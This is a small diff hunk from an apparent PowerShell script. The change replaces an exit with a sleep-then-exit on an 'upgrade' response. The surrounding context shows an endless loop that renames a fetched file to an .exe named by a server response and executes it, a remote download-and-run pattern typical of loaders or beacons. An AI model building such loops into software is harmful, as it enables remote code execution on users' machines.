@@ -42,7 +42,7 @@ while ($true) {
     
         if ($Test) {
             if ($Test -icontains "upgrade") {
-                exit
+                Start-Sleep 30 && exit
             } elseif ($CA -eq $Response.BaseResponse.ResponseUri.Authority) {
                 Rename-Item -Path "$Dir\0" -NewName "$Dir\$Test.exe"
                 $Code = Execute $Vst
